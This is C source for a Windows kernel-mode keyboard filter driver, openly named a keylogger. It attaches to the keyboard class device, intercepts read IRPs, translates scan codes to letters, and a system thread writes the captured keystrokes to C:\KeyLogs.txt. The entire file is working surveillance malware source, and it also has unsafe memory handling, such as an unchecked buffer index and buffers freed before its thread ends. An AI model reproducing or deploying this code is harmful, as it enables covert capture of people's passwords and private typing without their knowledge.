/* Souhail Hammou - 2014 */
#include <ntddk.h>
#include <Ntddkbd.h>
typedef struct {
	char output[256];
	int index;
	KSPIN_LOCK BufferLock;
}OUT_BUF,*POUT_BUF;
PDEVICE_OBJECT NextLowerDriverDeviceObject,KeyloggerDeviceObject;
unsigned int IrpsToComplete;
UCHAR ThreadOver,ThreadTerminated;
HANDLE Threadhnd;
POUT_BUF LogBuffer;
char* UpperChar,*UpperScan,*NonPagedStorage;
void AttachDevice(PDRIVER_OBJECT DriverObject){
	UNICODE_STRING TargetDeviceName;
	NTSTATUS Status;
	RtlInitUnicodeString(&TargetDeviceName,L"\\Device\\KeyboardClass0");
	/*Create a device object for the driver*/
	Status = IoCreateDevice(DriverObject,0,NULL,FILE_DEVICE_KEYBOARD,0,FALSE,&KeyloggerDeviceObject);
	if(!NT_SUCCESS(Status)){
		DbgPrint("IoCreateDevice Failed with status code %x",Status);
		return;
	}
	KeyloggerDeviceObject->Flags |= DO_BUFFERED_IO | DO_DEVICE_HAS_NAME | DRVO_LEGACY_RESOURCES;
	/*Clear it so the device can start receiving IRPs*/
	KeyloggerDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	Status = IoAttachDevice(KeyloggerDeviceObject,&TargetDeviceName,&NextLowerDriverDeviceObject);
	if(!NT_SUCCESS(Status)){
		DbgPrint("IoAttachDevice Failed with status code %x",Status);
	}

}
void UnloadRoutine(IN PDRIVER_OBJECT DriverObject){
	KTIMER Timer;
	LARGE_INTEGER DueTime;
	DueTime.QuadPart = 10000; //1 ms
	KeInitializeTimer(&Timer);
	/*Before unloading the driver be sure that no IRPs are still waiting to be completed*/
	while(IrpsToComplete > 0){
		KeSetTimer(&Timer,DueTime,NULL);
		KeWaitForSingleObject(&Timer,Executive,KernelMode,FALSE,NULL);
	}
	IoDetachDevice(NextLowerDriverDeviceObject);
	IoDeleteDevice(KeyloggerDeviceObject);
	KeCancelTimer(&Timer);
	ExFreePool(NonPagedStorage);
	ExFreePool(LogBuffer);
	ThreadOver = 1;
	/*Wait until the thread is terminated*/
	while(!ThreadTerminated){
		KeSetTimer(&Timer,DueTime,NULL);
		KeWaitForSingleObject(&Timer,Executive,KernelMode,FALSE,NULL);
	}
	DbgPrint("Unloaded\n");
}
NTSTATUS KeyloggerCompletion(PDEVICE_OBJECT DeviceObject,PIRP Irp,PVOID Context){
	KIRQL SavedIrql;
	/*System buffer is a pointer to an array of KEYBOARD_INPUT_DATA structures*/
	PKEYBOARD_INPUT_DATA InputData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
	/*The number of structures is described by Irp->IoStatus.Information*/
	unsigned int InputCount = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
	unsigned int i,j;
	/*Decrement IRPs to complete counter*/
	IrpsToComplete--;
	/*Acquire the shared buffer stucture lock*/
	SavedIrql = KfAcquireSpinLock(&LogBuffer->BufferLock);
	for(i=0;i<InputCount;i++){	
		/*Flags_LSB == 0 => Key_Press*/
		if(!(InputData[i].Flags & 1)){
			for(j=0;j<27;j++){
				if(UpperScan[j] == InputData[i].MakeCode){
					LogBuffer->output[LogBuffer->index++] = UpperChar[j];
					break;
				}
			}
		}
	}
	/*Release the lock*/
	KfReleaseSpinLock(&LogBuffer->BufferLock,SavedIrql);
	if(Irp->PendingReturned)
		IoMarkIrpPending(Irp);
	return STATUS_SUCCESS;
}
NTSTATUS KeyloggerHandler(PDEVICE_OBJECT DeviceObject,PIRP Irp){
	/*Register a completion routine then pass the IRP down to the next lower device*/
	IrpsToComplete++;
	IoCopyCurrentIrpStackLocationToNext(Irp);
	IoSetCompletionRoutine(Irp,KeyloggerCompletion,NULL,TRUE,FALSE,FALSE);
	return IoCallDriver(NextLowerDriverDeviceObject,Irp);
}
NTSTATUS DefaultHandler(PDEVICE_OBJECT DeviceObject,PIRP Irp){
	/*Simply pass the IRP down the device stack*/
	IoSkipCurrentIrpStackLocation(Irp);
	return IoCallDriver(NextLowerDriverDeviceObject,Irp);
}
VOID ThreadRoutine(PVOID Context){
	UNICODE_STRING ObjectName;
	OBJECT_ATTRIBUTES ObjAttr;
	HANDLE FileHandle;
	KIRQL Irql;
	NTSTATUS Status;
	IO_STATUS_BLOCK StatusBlock;
	/*Create KeyLogs.txt file in the C:\ directory*/
	RtlInitUnicodeString(&ObjectName,L"\\DosDevices\\C:\\KeyLogs.txt");
	InitializeObjectAttributes(&ObjAttr,&ObjectName,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);
	Status = ZwCreateFile(&FileHandle,GENERIC_WRITE,&ObjAttr,&StatusBlock,NULL,FILE_ATTRIBUTE_NORMAL,NULL,FILE_OVERWRITE_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);
	if(!NT_SUCCESS(Status)){
		DbgPrint("Create File Failed");
		goto ret;
	}
	/*File Created , now we have to wait for some buffer*/
	/*Keep looping until the driver unloads*/
	do{
		Irql = KfAcquireSpinLock(&LogBuffer->BufferLock);
		if(LogBuffer->index != 0){
			/*Lower the IRQL so we can call ZwWriteFile (KfAcquireSpinLock raises it to DISPATCH_LEVEL)*/
			KeLowerIrql(PASSIVE_LEVEL);
			/*Write the buffer to the file*/
			Status = ZwWriteFile(FileHandle,NULL,NULL,NULL,&StatusBlock,LogBuffer->output,LogBuffer->index,NULL,NULL);
			if(!NT_SUCCESS(Status)){
				DbgPrint("NtWriteFile Failed with Status %x",Status);
			}
			/*Raise back the IRQL to DISPATCH_LEVEL*/
			KfRaiseIrql(DISPATCH_LEVEL);
			/*Reset the index*/
			LogBuffer->index = 0;
		}
		/*Release the lock*/
		KfReleaseSpinLock(&LogBuffer->BufferLock,Irql);
	}while(!ThreadOver);
	ZwClose(FileHandle);
	ret:
	DbgPrint("Thread Terminated");
	ThreadTerminated = 1;
}
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
	unsigned int i;
	NTSTATUS Status;
	OBJECT_ATTRIBUTES ObjAttr;
	char UpScans[] = {16,48,46,32,18,33,34,35,23,36,37,38,39,49,24,25,30,19,31,20,22,47,44,45,21,17,57};
	char UpChars[] = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',' '};
	IrpsToComplete = 0;
	ThreadOver = 0;
	ThreadTerminated = 0;
	DriverObject->DriverUnload = UnloadRoutine;
	for(i=0;i<=IRP_MJ_MAXIMUM_FUNCTION;i++)
		DriverObject->MajorFunction[i] = DefaultHandler;
	/*Setup an IRP_MJ_READ Routine*/
	DriverObject->MajorFunction[IRP_MJ_READ] = KeyloggerHandler;
	//-----------------------
	/*Allocate a Non-Paged block to store the scan codes (IRP completion routine executes at <= DISPATCH_LEVEL)*/
	NonPagedStorage = (char*)ExAllocatePool(NonPagedPool,sizeof(UpChars)+sizeof(UpScans));
	if(!NonPagedStorage)
		return STATUS_SUCCESS;
	UpperScan = NonPagedStorage;
	UpperChar = NonPagedStorage + sizeof(UpScans);
	/*Copy the scan codes and their equivalent chars to the non paged memory block*/
	memcpy(UpperScan,UpScans,sizeof(UpScans));
	memcpy(UpperChar,UpChars,sizeof(UpChars));
	//-----------------------
	/*Create the logging structure and initialize its spin lock*/
	LogBuffer = (POUT_BUF)ExAllocatePool(NonPagedPool,sizeof(OUT_BUF));
	LogBuffer->index = 0;
	KeInitializeSpinLock(&LogBuffer->BufferLock);
	//-----------------------
	/*Create a system thread which mission will be to write the keystrokes to a log file*/
	InitializeObjectAttributes(&ObjAttr,NULL,OBJ_KERNEL_HANDLE,NULL,NULL);
	Status = PsCreateSystemThread(&Threadhnd,THREAD_ALL_ACCESS,&ObjAttr,NULL,NULL,ThreadRoutine,NULL);
	if(!NT_SUCCESS(Status))
			return STATUS_SUCCESS;
	//-----------------------
	/*Create a device object and attach our device to the keyboard's device stack*/
	AttachDevice(DriverObject);
	return STATUS_SUCCESS;
}
